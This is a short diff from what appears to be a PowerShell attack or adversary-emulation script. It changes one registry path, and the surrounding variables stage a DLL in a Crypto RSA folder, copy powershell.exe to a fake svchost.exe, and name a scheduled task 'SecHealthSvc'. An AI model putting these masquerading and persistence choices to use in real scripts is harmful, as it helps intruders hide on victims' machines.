@@ -39,7 +39,7 @@ $stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
 $infPath = "C:\ProgramData\config.inf"
 $masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 $masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
-$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
 $regName = "App"
 $taskName = "SecHealthSvc"
 
